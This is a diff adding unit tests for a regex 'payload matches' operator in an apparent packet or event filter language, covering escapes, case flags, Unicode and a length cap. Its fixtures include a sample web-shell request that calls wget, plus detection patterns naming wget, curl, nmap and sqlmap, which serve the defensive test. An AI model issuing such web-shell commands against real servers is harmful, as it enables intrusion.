@@ -499,4 +499,128 @@ describe('parenthesized groups', () => {
             expect(filterState.suggestions).toEqual([hint]);
         }
     });
+
+    test('payload matches runs a regular expression over the payload', () => {
+        const payload = Buffer.from('GET /shell.php?cmd=wget http://x/y').toString('base64');
+        const event = generateTestEvent(80, '123', '192.168.1.1', payload);
+        const run = (q: string) => {
+            const sx = parseDSL(q);
+            expect(sx.lexErrors).toHaveLength(0);
+            expect(sx.parseErrors).toHaveLength(0);
+            expect(sx.regexErrors).toHaveLength(0);
+            return filterEvent(event, sx.cst!);
+        };
+
+        expect(run('payload matches "wget|curl"')).toBeTruthy();
+        expect(run('payload ~ "wget|curl"')).toBeTruthy();
+        expect(run('payload matches "^GET /[^ ]*\\.php"')).toBeTruthy();
+        expect(run('payload matches "nmap|sqlmap"')).toBeFalsy();
+        // The pattern is a regex, not a substring: an anchor and an alternation prove it.
+        expect(run('payload matches "^wget"')).toBeFalsy();
+        expect(run('payload contains "wget|curl"')).toBeFalsy();
+    });
+
+    test('payload matches composes with not and and', () => {
+        const payload = Buffer.from('POST /admin').toString('base64');
+        const event = generateTestEvent(445, '123', '192.168.1.1', payload);
+
+        let sx = parseDSL('not payload matches "^GET" and tcp.port == 445');
+        expect(sx.parseErrors).toHaveLength(0);
+        expect(filterEvent(event, sx.cst!)).toBeTruthy();
+
+        sx = parseDSL('payload matches "^(GET|POST)" and tcp.port == 445');
+        expect(sx.parseErrors).toHaveLength(0);
+        expect(filterEvent(event, sx.cst!)).toBeTruthy();
+    });
+
+    test('an invalid regex is reported instead of throwing', () => {
+        const bad = parseDSL('payload matches "("');
+        expect(bad.lexErrors).toHaveLength(0);
+        expect(bad.parseErrors).toHaveLength(0);
+        expect(bad.regexErrors.length).toBeGreaterThan(0);
+
+        // A valid pattern, and `contains`, leave regexErrors empty.
+        expect(parseDSL('payload matches "(ok)"').regexErrors).toHaveLength(0);
+        expect(parseDSL('payload contains "("').regexErrors).toHaveLength(0);
+    });
+
+    test('suggests contains and matches after payload', () => {
+        const filterState = { suggestions: [], partialToken: null };
+        parseDSL('payload ', filterState);
+        expect(filterState.suggestions).toEqual(['contains', 'matches']);
+        parseDSL('payload matches ', filterState);
+        expect(filterState.suggestions).toEqual(['"regex"']);
+        parseDSL('payload ~ ', filterState);
+        expect(filterState.suggestions).toEqual(['"regex"']);
+        parseDSL('payload contains ', filterState);
+        expect(filterState.suggestions).toEqual(['"msg"']);
+    });
+    test('a pattern keeps its backslashes', () => {
+        const run = (text: string, query: string) => {
+            const payload = Buffer.from(text).toString('base64');
+            const sx = parseDSL(query);
+            expect(sx.parseErrors).toHaveLength(0);
+            expect(sx.regexErrors).toHaveLength(0);
+            return filterEvent(generateTestEvent(80, '123', '192.168.1.1', payload), sx.cst!);
+        };
+
+        // \. is a literal dot. Unescaping the pattern first would leave a bare . here, which
+        // matches any character, so the second case is what shows the backslash survived.
+        expect(run('GET /shell.php', 'payload ~ "shell\\.php"')).toBeTruthy();
+        expect(run('GET /shellXphp', 'payload ~ "shell\\.php"')).toBeFalsy();
+
+        // \d would arrive as a plain d, and \b as a backspace, if the pattern were unescaped.
+        expect(run('cmd=1234', 'payload ~ "cmd=\\d+"')).toBeTruthy();
+        expect(run('cmd=abcd', 'payload ~ "cmd=\\d+"')).toBeFalsy();
+        expect(run('run wget now', 'payload ~ "\\bwget\\b"')).toBeTruthy();
+        expect(run('downloadwgetter', 'payload ~ "\\bwget\\b"')).toBeFalsy();
+
+        // An escaped quote still reaches the expression as a quote.
+        expect(run('say "hi"', 'payload ~ "say \\"hi\\""')).toBeTruthy();
+    });
+
+    test('a leading (?i) makes the pattern case insensitive', () => {
+        const payload = Buffer.from('GET /x?cmd=WgEt').toString('base64');
+        const event = generateTestEvent(80, '123', '192.168.1.1', payload);
+        const run = (query: string) => {
+            const sx = parseDSL(query);
+            expect(sx.regexErrors).toHaveLength(0);
+            return filterEvent(event, sx.cst!);
+        };
+
+        expect(run('payload matches "(?i)wget"')).toBeTruthy();
+        // Without the flag a pattern is case sensitive, which is the default.
+        expect(run('payload matches "wget"')).toBeFalsy();
+    });
+
+    test('a pattern matches characters, not bytes', () => {
+        const payload = Buffer.from('GET /café ü', 'utf8').toString('base64');
+        const event = generateTestEvent(80, '123', '192.168.1.1', payload);
+        const run = (query: string) => {
+            const sx = parseDSL(query);
+            expect(sx.regexErrors).toHaveLength(0);
+            return filterEvent(event, sx.cst!);
+        };
+
+        expect(run('payload matches "café"')).toBeTruthy();
+        // é is two bytes, so matching bytes would need two dots to cover it.
+        expect(run('payload ~ "caf.$"')).toBeFalsy();
+        expect(run('payload ~ "caf. ü$"')).toBeTruthy();
+    });
+
+    test('only the start of a long payload is matched', () => {
+        const payload = Buffer.from('a'.repeat(16 * 1024) + 'needle').toString('base64');
+        const event = generateTestEvent(80, '123', '192.168.1.1', payload);
+        const run = (query: string) => {
+            const sx = parseDSL(query);
+            expect(sx.regexErrors).toHaveLength(0);
+            return filterEvent(event, sx.cst!);
+        };
+
+        // Beyond the cap that keeps a slow pattern from locking up the page.
+        expect(run('payload matches "needle"')).toBeFalsy();
+        expect(run('payload matches "^a+"')).toBeTruthy();
+        // contains is a plain substring test, so it is not capped.
+        expect(run('payload contains "needle"')).toBeTruthy();
+    });
 });
